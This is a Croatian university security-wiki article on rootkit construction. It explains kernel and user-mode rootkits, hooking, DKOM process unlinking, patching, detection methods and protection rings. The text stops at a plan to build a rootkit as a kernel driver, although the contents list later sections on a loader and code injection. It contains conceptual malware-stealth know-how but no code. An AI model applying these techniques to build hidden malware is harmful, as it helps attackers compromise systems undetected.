<!DOCTYPE html>
<html lang="hr" dir="ltr">
<head>
<meta charset="UTF-8" />
<title>Razvoj naprednih tehnika za izradu malwarea/rootkita - SIS Wiki</title>
<meta name="generator" content="MediaWiki 1.17.0" />
<link rel="shortcut icon" href="http://security.foi.hr/favicon.ico" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch_desc.php" title="SIS Wiki (hr)" />
<link rel="EditURI" type="application/rsd+xml" href="../../api.php%3Faction=rsd" />
<link title="Creative Commons" type="application/rdf+xml" href="http://security.foi.hr/wiki/index.php?title=Razvoj_naprednih_tehnika_za_izradu_malwarea/rootkita&amp;action=creativecommons" rel="meta" />
<link rel="copyright" href="http://creativecommons.org/licenses/by-sa/3.0/" />
<link rel="alternate" type="application/atom+xml" title="SIS Wiki Atom izvor" href="../../index.php%3Ftitle=Posebno:Nedavne_promjene&amp;feed=atom" />
<link rel="stylesheet" href="../../load.php%3Fdebug=false&amp;lang=hr&amp;modules=mediawiki.legacy.commonPrint%252Cshared%257Cskins.vector&amp;only=styles&amp;skin=vector&amp;*.css" />
<meta name="ResourceLoaderDynamicStyles" content="" />
<!--[if lt IE 7]><style type="text/css">body{behavior:url("/wiki/skins/vector/csshover.min.htc")}</style><![endif]--></head>
<body class="mediawiki ltr ns-0 ns-subject page-Razvoj_naprednih_tehnika_za_izradu_malwarea_rootkita skin-vector">
		<div id="mw-page-base" class="noprint"></div>
		<div id="mw-head-base" class="noprint"></div>
		<!-- content -->
		<div id="content">
			<a id="top"></a>
			<div id="mw-js-message" style="display:none;"></div>
						<!-- firstHeading -->
			<h1 id="firstHeading" class="firstHeading">Razvoj naprednih tehnika za izradu malwarea/rootkita</h1>
			<!-- /firstHeading -->
			<!-- bodyContent -->
			<div id="bodyContent">
				<!-- tagline -->
				<div id="siteSub">Izvor: SIS Wiki</div>
				<!-- /tagline -->
				<!-- subtitle -->
				<div id="contentSub"></div>
				<!-- /subtitle -->
																<!-- jumpto -->
				<div id="jump-to-nav">
					Skoči na: <a href="rootkita.html#mw-head">orijentacija</a>,
					<a href="rootkita.html#p-search">traži</a>
				</div>
				<!-- /jumpto -->
								<!-- bodytext -->
				<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Sadržaj</h2></div>
<ul>
<li class="toclevel-1 tocsection-1"><a href="rootkita.html#Rootkit_.E2.80.93_op.C4.87enito"><span class="tocnumber">1</span> <span class="toctext">Rootkit – općenito</span></a>
<ul>
<li class="toclevel-2 tocsection-2"><a href="rootkita.html#Kategorije_rootkita"><span class="tocnumber">1.1</span> <span class="toctext">Kategorije rootkita</span></a>
<ul>
<li class="toclevel-3 tocsection-3"><a href="rootkita.html#Kernel_Mode_.28jezgreni.29_rootkiti"><span class="tocnumber">1.1.1</span> <span class="toctext">Kernel Mode (jezgreni) rootkiti</span></a></li>
<li class="toclevel-3 tocsection-4"><a href="rootkita.html#User_Mode_.28korisni.C4.8Dki.29_rootkiti"><span class="tocnumber">1.1.2</span> <span class="toctext">User Mode (korisnički) rootkiti</span></a></li>
</ul>
</li>
<li class="toclevel-2 tocsection-5"><a href="rootkita.html#Tehnike_kreiranja_rootkita"><span class="tocnumber">1.2</span> <span class="toctext">Tehnike kreiranja rootkita</span></a>
<ul>
<li class="toclevel-3 tocsection-6"><a href="rootkita.html#Maskiranje_datoteka"><span class="tocnumber">1.2.1</span> <span class="toctext">Maskiranje datoteka</span></a></li>
<li class="toclevel-3 tocsection-7"><a href="rootkita.html#Hooking_.28preusmjeravanje.29"><span class="tocnumber">1.2.2</span> <span class="toctext">Hooking (preusmjeravanje)</span></a></li>
<li class="toclevel-3 tocsection-8"><a href="rootkita.html#DKOM"><span class="tocnumber">1.2.3</span> <span class="toctext">DKOM</span></a></li>
<li class="toclevel-3 tocsection-9"><a href="rootkita.html#Patching"><span class="tocnumber">1.2.4</span> <span class="toctext">Patching</span></a></li>
<li class="toclevel-3 tocsection-10"><a href="rootkita.html#Virtualni_stroj"><span class="tocnumber">1.2.5</span> <span class="toctext">Virtualni stroj</span></a></li>
</ul>
</li>
<li class="toclevel-2 tocsection-11"><a href="rootkita.html#Tehnike_otkrivanja_rootkita"><span class="tocnumber">1.3</span> <span class="toctext">Tehnike otkrivanja rootkita</span></a>
<ul>
<li class="toclevel-3 tocsection-12"><a href="rootkita.html#Otkrivanje_na_temelju_poznatog_koda"><span class="tocnumber">1.3.1</span> <span class="toctext">Otkrivanje na temelju poznatog koda</span></a></li>
<li class="toclevel-3 tocsection-13"><a href="rootkita.html#Nadzor_integriteta_datoteka"><span class="tocnumber">1.3.2</span> <span class="toctext">Nadzor integriteta datoteka</span></a></li>
<li class="toclevel-3 tocsection-14"><a href="rootkita.html#Unakrsna_analiza"><span class="tocnumber">1.3.3</span> <span class="toctext">Unakrsna analiza</span></a></li>
<li class="toclevel-3 tocsection-15"><a href="rootkita.html#Heuristi.C4.8Dka_detekcija"><span class="tocnumber">1.3.4</span> <span class="toctext">Heuristička detekcija</span></a></li>
</ul>
</li>
</ul>
</li>
<li class="toclevel-1 tocsection-16"><a href="rootkita.html#Protection_rings"><span class="tocnumber">2</span> <span class="toctext">Protection rings</span></a></li>
<li class="toclevel-1 tocsection-17"><a href="rootkita.html#Octopus_Rootkit"><span class="tocnumber">3</span> <span class="toctext">Octopus Rootkit</span></a>
<ul>
<li class="toclevel-2 tocsection-18"><a href="rootkita.html#Sistemski_dio_rootkita_.28Driver.29"><span class="tocnumber">3.1</span> <span class="toctext">Sistemski dio rootkita (Driver)</span></a>
<ul>
<li class="toclevel-3 tocsection-19"><a href="rootkita.html#DKOM_.28Direct_kernel_object_manipulation.29"><span class="tocnumber">3.1.1</span> <span class="toctext">DKOM (Direct kernel object manipulation)</span></a></li>
<li class="toclevel-3 tocsection-20"><a href="rootkita.html#Skrivanje_procesa"><span class="tocnumber">3.1.2</span> <span class="toctext">Skrivanje procesa</span></a></li>
<li class="toclevel-3 tocsection-21"><a href="rootkita.html#Pokretanje_aplikacije_iz_jezgre_ra.C4.8Dunala"><span class="tocnumber">3.1.3</span> <span class="toctext">Pokretanje aplikacije iz jezgre računala</span></a></li>
<li class="toclevel-3 tocsection-22"><a href="rootkita.html#Automatsko_pokretanje_malicioznog_sadr.C5.BEaja_prilikom_startanja_Windowsa"><span class="tocnumber">3.1.4</span> <span class="toctext">Automatsko pokretanje malicioznog sadržaja prilikom startanja Windowsa</span></a></li>
</ul>
</li>
<li class="toclevel-2 tocsection-23"><a href="rootkita.html#Korisni.C4.8Dki_dio"><span class="tocnumber">3.2</span> <span class="toctext">Korisnički dio</span></a>
<ul>
<li class="toclevel-3 tocsection-24"><a href="rootkita.html#Ostvarivanje_dvosmjerne_komunikacije_izme.C4.91u_korisni.C4.8Dke_aplikacije_i_drivera"><span class="tocnumber">3.2.1</span> <span class="toctext">Ostvarivanje dvosmjerne komunikacije između korisničke aplikacije i drivera</span></a></li>
<li class="toclevel-3 tocsection-25"><a href="rootkita.html#Definiranje_programa_koji_se_trebaju_pokrenuti_ili_skriti"><span class="tocnumber">3.2.2</span> <span class="toctext">Definiranje programa koji se trebaju pokrenuti ili skriti</span></a></li>
</ul>
</li>
<li class="toclevel-2 tocsection-26"><a href="rootkita.html#Loader"><span class="tocnumber">3.3</span> <span class="toctext">Loader</span></a>
<ul>
<li class="toclevel-3 tocsection-27"><a href="rootkita.html#Stvaranje_drivera_iz_BLOB-a_koji_je_spremljen_u_aplikaciji"><span class="tocnumber">3.3.1</span> <span class="toctext">Stvaranje drivera iz BLOB-a koji je spremljen u aplikaciji</span></a></li>
<li class="toclevel-3 tocsection-28"><a href="rootkita.html#Pode.C5.A1avanje_i_instaliranje_drivera_na_ra.C4.8Dunalo"><span class="tocnumber">3.3.2</span> <span class="toctext">Podešavanje i instaliranje drivera na računalo</span></a></li>
</ul>
</li>
</ul>
</li>
<li class="toclevel-1 tocsection-29"><a href="rootkita.html#Napredne_metode_evolucije_malwarea"><span class="tocnumber">4</span> <span class="toctext">Napredne metode evolucije malwarea</span></a>
<ul>
<li class="toclevel-2 tocsection-30"><a href="rootkita.html#Enkriptiranje"><span class="tocnumber">4.1</span> <span class="toctext">Enkriptiranje</span></a></li>
<li class="toclevel-2 tocsection-31"><a href="rootkita.html#Polimorfizam"><span class="tocnumber">4.2</span> <span class="toctext">Polimorfizam</span></a></li>
<li class="toclevel-2 tocsection-32"><a href="rootkita.html#Metamorfizam"><span class="tocnumber">4.3</span> <span class="toctext">Metamorfizam</span></a></li>
</ul>
</li>
<li class="toclevel-1 tocsection-33"><a href="rootkita.html#Code_injection"><span class="tocnumber">5</span> <span class="toctext">Code injection</span></a>
<ul>
<li class="toclevel-2 tocsection-34"><a href="rootkita.html#Portable_Executable_Code_Injection"><span class="tocnumber">5.1</span> <span class="toctext">Portable Executable Code Injection</span></a>
<ul>
<li class="toclevel-3 tocsection-35"><a href="rootkita.html#Format_PE"><span class="tocnumber">5.1.1</span> <span class="toctext">Format PE</span></a></li>
<li class="toclevel-3 tocsection-36"><a href="rootkita.html#Ubacivanje_koda"><span class="tocnumber">5.1.2</span> <span class="toctext">Ubacivanje koda</span></a></li>
<li class="toclevel-3 tocsection-37"><a href="rootkita.html#Za.C5.A1tita"><span class="tocnumber">5.1.3</span> <span class="toctext">Zaštita</span></a></li>
</ul>
</li>
</ul>
</li>
<li class="toclevel-1 tocsection-38"><a href="rootkita.html#Literatura"><span class="tocnumber">6</span> <span class="toctext">Literatura</span></a></li>
<li class="toclevel-1 tocsection-39"><a href="rootkita.html#.C4.8Clanovi_tima"><span class="tocnumber">7</span> <span class="toctext">Članovi tima</span></a></li>
</ul>
</td></tr></table>
<h2> <span class="mw-headline" id="Rootkit_.E2.80.93_op.C4.87enito">Rootkit – općenito</span></h2>
<p>Maliciozni programi dio su informatičke svakodnevice dvadesetprvog stoljeća. Kako bismo bili u mogućnosti poduzeti odgovarajuće mjere zaštite, postalo je nužno poznavati njihove oblike, karakteristike i načine širenja. Pojam malicioznih programa (eng. malware) obuhvaća sve vrste računalnog softwarea kreiranog u svrhu izvršavanja nepoželjnih aktivnosti na korisnikovom računalu bez njegovog znanja. Kao osnovne kategorije malicioznih programa moguće je navesti viruse, crve, trojanske konje,  adware, spyware, rootkit, ransomware i scareware. U ovom radu detaljnije će biti objašnjene vrste, načini rada i karakteristike rootkita. 
</p>
<div class="thumb tright"><div class="thumbinner" style="width:510px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Rootkit_Numbers.jpg" class="image"><img alt="" src="../../images/8/8b/Rootkit_Numbers.jpg" width="508" height="365" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Rootkit_Numbers.jpg" class="internal" title="Povećaj"><img src="../../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>Rootkiti na Windowsima u 2011. godini <a href="http://www.neowin.net/news/avast-windows-xp-makes-up-74-of-rootkit-infections" class="external autonumber" rel="nofollow">[3]</a></div></div></div>
<p>Rootkite možemo definirati kao maliciozne programe čija je namjena neovlašteni pristup  i ostvarivanje i zadržavanje određene razine kontrole zaraženog računala, uz istovremeno  prikrivanje vlastitih i stranih datoteka, procesa i  zapisa u registrima koji se koriste pri preuzimanju kontrole i izvršavanju zlonamjernih aktivnosti na računalu. Naziv rootkit nastao je kao složenica engleskog naziva za UNIX korisnika s najvišom razinom ovlasti (root), te engleske riječi za alat (kit). 
</p><p>Rootkit u užem smislu predstavlja alat za sakrivanje napadačevih aktivnosti te ostvarivanje kontrole nad zaraženim računalom, dok u kombinaciji sa ostalim oblicima malicioznih programa do izražaja dolazi njegova štetna komponenta. Sukladno tome, rootkit u praksi predstavlja samo jednu od komponenata  malicioznog software-a. Na slici 1 prikazana je raspodjela računala na kojima je u 2011. godini detektirana zaraza nekim oblikom rootkita, a koristila su neku od tri verzije operativnog sustava MS Windows sa instaliranim Avast antivirusnim programom, u ovisnosti o tržišnom udjelu (raspodjela se također odnosi na Windowse). 
</p><p><br />
</p>
<h3> <span class="mw-headline" id="Kategorije_rootkita"> Kategorije rootkita </span></h3>
<p>S obzirom na domenu izvršavanja razlikujemo korisničke (sakrivaju se od korisnika modificiranjem funkcija za pretraživanje datotečnog sustava, te prilikom pretraživanja izostavljaju sve podatke vezane za rootkit) i jezgrene (odlikuje ih presijecanje komunikacije s kernelom, te modificiranje podatkovne strukture jezgre, što omogućuje skrivanje zlonamjernih procesa iz ukupne liste procesa koji se izvršavaju na računalu) rootkite. Sa aspekta ovisnosti prisutstva rootkita na zaraženom računalu o sesiji operativnog sustava razlikujemo postojane („trajne“) rootkite (aktiviraju se prilikom svakog pokretanja operativnog sustava, uglavnom se nalaze u registryju ili u datotečnom sustavu) i rootkite koji se pohranjuju u radnoj memoriji (nepostojani - brišu se prilikom gašenja OS-a).
</p>
<h4> <span class="mw-headline" id="Kernel_Mode_.28jezgreni.29_rootkiti"> Kernel Mode (jezgreni) rootkiti </span></h4>
<p>Ova vrsta rootkita izuzetno je opasna, budući da napadaču daje kontrolu na svim razinama sustava. Korištenjem funkcija jezgre omogućava nadzor i modificiranje komunikacije između jezgre, hardwarea i korisničkih aplikacija. Rootkit je moguće instalirati preko ulaznih modula jezgre, koji tokom svakodnevnog rada služe za instalaciju aplikacija i drivera stranih (neovisnih o operativnom sustavu) uređaja. Na taj način napadač dobiva širi skup ovlasti, te je u mogućnosti kontrolirati pristup, portove, operacije nad datotekama i direktorijima i slično. Skupovi ovlasti podijeljeni su u četiri grupe (prstena) i to tako da prva grupa (Ring 0) s najvišim ovlastima omogućuje pristup jezgri, dok četvrta grupa (Ring 3) sadrži ograničen skup ovlasti koje se tiču isključivo korisnikovog rada na računalu. U grupama Ring 1 i Ring 2 nalaze se upravljački programi (za grafičku karticu i sl.), no u praksi su ovlasti dodijeljene samo krajnjim grupama (jezgra i korisnički mod), što napadaču olakšava pristup i vršenje željenih aktivnosti. Rootkiti se, međutim, ne moraju koristiti u zlonamjerne svrhe. Primjerice, programi kao što su Deamon Tools, Power ISO, Alcohol 120% i sl. koriste rootkite kako bi kreirali virtualne pogone.  
</p>
<h4> <span class="mw-headline" id="User_Mode_.28korisni.C4.8Dki.29_rootkiti"> User Mode (korisnički) rootkiti </span></h4>
<div class="thumb tright"><div class="thumbinner" style="width:277px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Filter.png" class="image"><img alt="" src="../../images/3/35/Filter.png" width="275" height="340" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Filter.png" class="internal" title="Povećaj"><img src="../../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>Filtriranje malicioznih datoteka <a href="http://edwardsnyder.com/principles-of-computer-surveil" class="external autonumber" rel="nofollow">[4]</a></div></div></div>
<p>Korisnički rootkiti egzistiraju na četvrtoj razini zaštite (Ring 3), te koriste API (eng. Application Programming Interface – programsko sučelje aplikacija) za komuniciranje sa resursima operativnog sustava, odnosno presretanje i modificiranje zahtjeva i odgovora legitimnih aplikacija pomoću dll datoteka. DLL (eng. Dynamic Link Library) datoteke predstavljaju svojevrsne posrednike između korisničkih aplikacija i jezgre operativnog sustava. S obzirom da ne komuniciraju direktno sa jezgrom, mogućnosti korisničkih rootkita su ograničene, ali ne i zanemarive. Ova vrsta rootkita se detektira i uklanja jednostavnije od jezgrenih rootkita, no i sama izrada je jednostavnija, stoga se i danas relativno često susreću u praksi.
</p><p><br />
Slika 2 prikazuje učinak filtriranja malicioznih datoteka na računalu zaraženom korisničkim rootkitom. Koraci filtriranja malicioznih podataka su sljedeći:
</p>
<ul><li> Rootkit je postavljen na poziciju koja omogućava presretanje zahtjeva poslanih od strane legitimnih programa bez znanja operativnog sustava.
</li><li> Tada rootkit šalje zahtjev OS-u predstavljajući se kao legitimni program.
</li><li> Operativni sustav u odgovoru šalje podatke, koje rootkit pregledava.
</li><li> Rootkit uklanja znakove svoje egzistencije, te filtrirani rezultat prosljeđuje legitimnom programu, koji dobivene podatke koristi ne znajući da su
</li></ul>
<p> u međuvremenu promjenjeni. 
</p><p>U primjeru je prikazano filtriranje prilikom korištenja datotečnog preglednika, no na istom principu moguće je sakriti i trenutno aktivne procese, zapise u registrima itd.
</p><p><br />
</p><p><br />
</p><p><br />
</p>
<h3> <span class="mw-headline" id="Tehnike_kreiranja_rootkita"> Tehnike kreiranja rootkita </span></h3>
<p>Imajući na umu da je prikrivenost jedna od ključnih osobina rootkita, prilikom njihove izrade nužno je obratiti posebnu pozornost na skrivanje malicioznog sadržaja. U tu svrhu koriste se brojne tehnike, a najpopularnije su preusmjeravanje (hooking), izmjena sadržaja (patching) i manipuliranje podatkovnom strukturom. 
</p>
<h4> <span class="mw-headline" id="Maskiranje_datoteka"> Maskiranje datoteka </span></h4>
<div class="thumb tright"><div class="thumbinner" style="width:402px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Hooking.png" class="image"><img alt="" src="../../images/thumb/8/8c/Hooking.png/400px-Hooking.png" width="400" height="265" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Hooking.png" class="internal" title="Povećaj"><img src="../../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>Prikaz preusmjeravanja funkcija <a href="http://www.dtic.mil/cgi-bin/GetTRDoc?Location=U2&amp;doc=GetTRDoc.pdf&amp;AD=ADA519999" class="external autonumber" rel="nofollow">[5]</a></div></div></div>
<p>Jedna od starijih metoda funkcioniranja rootkita temelji se na zamjeni legitimnih sistemskih datoteka njihovim zaraženim verzijama, koje su pritom imale isti naziv, te koristile iste funkcije. Nedostatak ove tehnike je relativno lako otkrivanje pomoću cikličke provjere redundantnosti (CRC), budući da se prilikom usporedbe originalne i zaražene datoteke ne podudaraju CRC vrijednosti.
</p>
<h4> <span class="mw-headline" id="Hooking_.28preusmjeravanje.29"> Hooking (preusmjeravanje)</span></h4>
<p>Ova tehnika funkcionira na način da se pozivi sistemskih funkcija preusmjeravaju na maliciozni kod, odnosno mjenjaju se veze među objektima. Primjerice, moguće je zaobići originalno zatraženu funkciju, umjesto koje će se izvršiti modificirana verzija originalne funkcije, iz koje je izostavljen maliciozni sadržaj, koji će stoga ostati skriven, te ga korisnik neće detektirati. Slika 3 prikazuje koncept preusmjeravanja komunikacije. Umjesto direktne razmjene podataka, izvorna funkcija preusmjerava se na rootkit te se prosljeđuje ciljnoj funkciji, koja nakon izvršavanja zahtjevanih operacija rezultat vraća preko rootkita, čime je omogućeno njegovo modificiranje.  Ovu tehniku kreiranja rootkita nije moguće detektirati CRC provjerom, budući da se modifikacije ne izvršavaju nad originalnim podacima. Za detekciju rootkita ovog tipa koriste se programi koji skeniraju promjene u memoriji.   
</p>
<h4> <span class="mw-headline" id="DKOM"> DKOM </span></h4>
<p>Akronim DKOM<a href="http://www.dtic.mil/cgi-bin/GetTRDoc?Location=U2&amp;doc=GetTRDoc.pdf&amp;AD=ADA519999" class="external autonumber" rel="nofollow">[9]</a> označava izravnu manipulaciju objektima jezgre (eng. Direct Kernel Object Manipulation). To se prvenstveno odnosi na liste procesa, dretvi i portova koje se nalaze u memoriji jezgre, a koriste ih aplikacije prilikom prepoznavanja trenutno aktivnih procesa. Ova tehnika omogućava sakrivanje procesa i portova, izmjene ovlasti i sl. Prvi rootkit razvijen ovom tehnikom bio je FU, a djelovao je na način da modificira dvostruko vezanu listu tekućih procesa, kao što je prikazano na slici 4. Modificiranjem pokazivača na sljedeći (FLINK), odnosno prethodni (BLINK) proces sakriven je maliciozni proces, te se on ne prikazuje na listi trenutno aktivnih procesa. Usprkos tome, maliciozni kod se izvršava u pozadini, jer su promjene vršene u listi procesa, dok se lista dretvi nalazi u originalnom, netaknutom stanju. Pritom nije moguće pristupiti malicioznom procesu putem liste aktivnih procesa. Budući da se manipulacije odvijaju nad objektima u memoriji, DKOM se ne koristi za sakrivanje datoteka.
</p>
<h4> <span class="mw-headline" id="Patching"> Patching </span></h4>
<div class="thumb tright"><div class="thumbinner" style="width:402px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Tehnike.png" class="image"><img alt="" src="../../images/thumb/c/c4/Tehnike.png/400px-Tehnike.png" width="400" height="337" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Tehnike.png" class="internal" title="Povećaj"><img src="../../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>Modificiranje pokazivača vezane liste <a href="http://sce.uhcl.edu/yang/research/A%20Comparitive%20Analysis%20of%20Rootkit%20Detection%20Techniques.pdf" class="external autonumber" rel="nofollow">[6]</a></div></div></div>
<p>Ova tehnika oslanja se na modificiranje izvornog koda funkcije i promjene putanje izvršavanja, odnosno preusmjeravanja na maliciozni kod. Primjerice, to je moguće postići modificiranjem uvjetnih skokova u bezuvjetne skokove, čime se može stvoriti privid normalnog rada programa, dok se u stvari izvršava maliciozni kod.  Moguće je mjenjati putanje funkcija na disku ili koda koji se izvršava u memoriji, no ova tehnika je poprilično ranjiva na detekciju pomoću CRC-a i aplikacija za praćenje modifikacija jezgre.<a href="http://www.dtic.mil/cgi-bin/GetTRDoc?Location=U2&amp;doc=GetTRDoc.pdf&amp;AD=ADA519999" class="external autonumber" rel="nofollow">[10]</a>
</p>
<h4> <span class="mw-headline" id="Virtualni_stroj"> Virtualni stroj </span></h4>
<p>Rootkiti napisani ovom tehnikom za cilj imaju pretvaranje računala koje žele zaraziti u virtualni stroj. Na taj način napadači ostvaruju potpunu kontrolu zaraženog računala, budući da se u tom slučaju rootkit nalazi na nižoj (nadređenoj) razini. Shodno tome, zaraženo računalo nije svjesno prisutstva rootkita. 
</p><p><br />
</p>
<h3> <span class="mw-headline" id="Tehnike_otkrivanja_rootkita"> Tehnike otkrivanja rootkita </span></h3>
<p>Usporedno sa razvijanjem tehnika izrade rootkita, javila se potreba za razvojem programa koji će uspješno detektirati infiltraciju rootkita na računalo. Većina razvijenih antirootkit programa koristi nekoliko tehnika otkrivanja, kako bi se povećale šanse za uspješnu detekciju. U nastavku će biti ukratko opisane najčešće tehnike otkrivanja rootkita.
</p>
<h4> <span class="mw-headline" id="Otkrivanje_na_temelju_poznatog_koda"> Otkrivanje na temelju poznatog koda </span></h4>
<p>Ova metoda spada među najkorištenije tehnike detekcije prisutnosti rootkita u sustavu, a temelji se na pretpostavci da je traženi maliciozni kod otprije poznat. Ukoliko je pretpostavka zadovoljena, tada se navedeni kod analizira, te se identificira njemu svojstveni potpis, odnosno dio koda za koji je sa sigurnošću moguće utvrditi da služi izvršavanju nepoželjnih aktivnosti. Navedeni potpis tada se integrira u bazu podataka koju antirootkit program koristi prilikom skeniranja sustava.<a href="http://sce.uhcl.edu/yang/research/A%20Comparitive%20Analysis%20of%20Rootkit%20Detection%20Techniques.pdf" class="external autonumber" rel="nofollow">[11]</a> Ukoliko tokom skeniranja sustava program naiđe na dio koda koji odgovara potpisu malicioznog programa, vrlo je vjerojatno da je pronađeni kod nepoželjan, tj. da je računalo zaraženo rootkitom ili nekim drugim oblikom malicioznog softwarea. Iako se programi ovog tipa, ili programi koji uključuju slične algoritme i danas koriste, njihov je značajan nedostatak nemogućnost detekcije novih oblika rootkita, budući da u bazi podataka ne postoji uzorak njihovog koda, tj. njihov potpis.   
</p>
<h4> <span class="mw-headline" id="Nadzor_integriteta_datoteka"> Nadzor integriteta datoteka </span></h4>
<p>Nadzor integriteta funkcionira na principu izračunavanja hash vrijednosti datoteka bitnih za rad operativnog sustava, te uspoređivanja tih vrijednosti sa poznatim hash vrijednostima (kontrolna suma) istih datoteka koje su spremljene u bazu podataka. Baza hash vrijednosti generira se prilikom „čiste“ instalacije operativnog sustava, kako bi se osigurao čvrst temelj za uspoređivanje novih vrijednosti. Ukoliko se hash vrijednosti datoteke ne podudaraju, to je pouzdan znak da je njen sadržaj izmjenjen, što ukazuje na aktivnost malicioznih programa. Ova tehnika pokazala se djelotvornom u borbi protiv patching rootkita, no njena je očita mana neosjetljivost na hooking (preusmjeravane) i DKOM rootkite.
Detekcija preusmjeravanja Rootkiti temeljeni na preusmjeravanju učestalo koriste postojeće sistemske tablice, koje sadrže pokazivače na različite pokazivače na funkcije i prekidne rutine, koji se nalaze unutar definiranih memorijskih lokacija. Ukoliko rootkit promjeni originalni pokazivač, te ga usmjeri na maliciozni kod, velika je vjerojatnost da će isti pokazivati na memorijske lokacije koje ne pripadaju domeni definiranih, „sigurnih“ lokacija, što je pouzdan pokazatelj prisutnosti neželjenih programa u sustavu. Mana ove tehnike detekcije je ranjivost na rootkite koji se izvršavaju u jezgri (Ring 0), budući da oni imaju ovlasti potrebne za promjenu rezultata skeniranja antirootkit programa (rade na istoj razini), te je stoga moguće da maliciozni program izbjegne detekciju.
</p>
<h4> <span class="mw-headline" id="Unakrsna_analiza"> Unakrsna analiza </span></h4>
<p>Ova tehnika detekcije temelji se redundanci, odnosno uspoređivanju pripadajućih vrijednosti na aplikacijskom i fizičkom sloju. Pretpostavka je da se rootkit ne može sakriti prilikom skeniranja hardware-a, te se stoga uspoređuju dokumenti i vrijednosti registara, čiji izostanak  na aplikacijskom sloju ukazuje na pokušaj prikrivanja malicioznog koda. Tehnika unakrsne analize uspješno se primjenjuje pri detekciji DKOM i patching rootkita.
Mrežna detekcijaTehnika mrežne detekcije bazira se na praćenju mrežnog prometa i aktivnih portova. Trenutna slika stanja šalje se pouzdanom gateway-u, koji uspoređuje zaprimljenu sliku sa trenutnim stanjem koje je njemu vidljivo. Ukoliko postoje otvoreni portovi koji se ne pojavljuju na zaprimljenoj slici stanja, velika je vjerojatnost da je sustav zaražen rootkitom. Mrežnom detekcijom moguće je otkriti nove rootkite, te na taj način upotpuniti bazu potpisa antirootkit programa koji detekciju vrše na osnovu poznatog malicioznog koda.
</p>
<h4> <span class="mw-headline" id="Heuristi.C4.8Dka_detekcija"> Heuristička detekcija </span></h4>
<p>Ova tehnika detekcije rootkita temelji se na klasifikaciji neželjenog ponašanja sustava sukladno predefiniranim pravilima. Primjerice, pretpostavlja se da normalan intenzitet odlaznih email poruka ne može prelaziti određenu granicu, stoga je u slučaju iznimno povećanog intenziteta vrlo vjerojatno da se radi to aktivnostima malicioznih programa. Modificiranje jezgre računala također upućuje na isti zaključak. Ova metoda detekcije, kao i metoda praćenja mrežnog prometa, također omogućuje otkrivanje novih rootkita, no bitno je napomenuti kako su pri korištenju ove tehnike učestali slučajevi lažnih detekcija neželjenih aktivnosti.
</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Otepuric&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Otepuric (stranica ne postoji)">Ozren Tepuric</a> 22:11, 6. siječnja 2012. (CET)
</p>
<h2> <span class="mw-headline" id="Protection_rings">Protection rings</span></h2>
<div class="thumb tright"><div class="thumbinner" style="width:302px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Rings.png" class="image"><img alt="Protection rings" src="../../images/1/1f/Rings.png" width="300" height="216" class="thumbimage" /></a>  <div class="thumbcaption">Protection rings unutar Intel x86 procesora<a href="http://en.wikipedia.org/wiki/Ring_(computer_security)" class="external autonumber" rel="nofollow">[7]</a></div></div></div>
<p>Protection rings služe operacijskome sustavu da ograniči interakciju korisničkih programa s jezgrom (kernel-om) računala. Kao što možemo vidjeti na slici 1 postoje četiri razine zaštite unutar procesora.
</p><p>Moderni operacijski sustavi razlikuju samo dva načina rada, a to su User(Ring 3) i System(Ring 0) način rada.
</p><p>User mode se nalazi unutar Ring 3 prstena i on nadgleda da se korisnički kod izvodi unutar tih okvira, sprječava izvršavanje instrukcija iz korisničkog u sistemskom načinu. Ali kada aplikacija iz korisničkog načina treba pristupiti sustavskom načinu rada postoje predefinirana vrata<a href="http://en.wikipedia.org/wiki/System_call" class="external autonumber" rel="nofollow">[12]</a> koja dopuštaju razmjenu podataka između aplikacije i jezgre.
</p><p>Scenarij u kojem korisnička aplikacija treba pristupiti jezgri i njenim funkcijama je kada se aplikacija direktno veže uz driver koji se nalazi u jezgri računala. Kao što je software za skeniranje i skener, software za snimanje i webcamera i postoje mnogi drugi primjeri.
</p><p>Prilikom te interakcije izvode se sistemski pozivi koji omogućavaju pristup jezgri od strane korisničke aplikacije. Svi sistemski pozivi su izvedeni tako da sprječavaju neovlaštene pozive unutar jezgre. Postoje predefinirani sistemski pozivi koji paze da korisnik ne bi izvodi maliciozni kod.
</p>
<table class="wikitable">

<tr>
<th> RB
</th>
<th> Ovlasti
</th></tr>
<tr>
<td> Ring 0
</td>
<td> Jezgra računala (kernel), dopušten pristup svim instrukcijama.
</td></tr>
<tr>
<td> Ring 1
</td>
<td> Aplikaciji se dopušta prošireni spektar instrukcija, proširenje prstena Ring 2.
</td></tr>
<tr>
<td> Ring 2
</td>
<td> Aplikaciji se dopušta prošireni spektar instrukcija ali u manjoj mjeri nego Ring 1.
</td></tr>
<tr>
<td> Ring 3
</td>
<td> Korisničke aplikacije, nedopušten pristup instrukcijama jezgre.
</td></tr></table>
<p>Iz opisa primjera poziva sistemskih funkcija unutar jezgre možemo vidjeti da se driveri izvode unutar jezgre i da imaju najveće ovlasti unutar sustava. 
</p><p>Stoga unutar ove metode izrade rootkita, programski kod rootkita će se nalaziti unutar jezgre  kao driver i izvoditi će se u jezgri. Rootkit će predstavljati driver za nepostojeći uređaj u računalu. I samim time kada se rootkit postavi na računalo on će se pokretati unutar jezgre i neće imati problema s izvršavanjem funkcija jer će imati sve dostupne ovlasti i pristup svim funkcijama jezgre bez upletanja sustava.
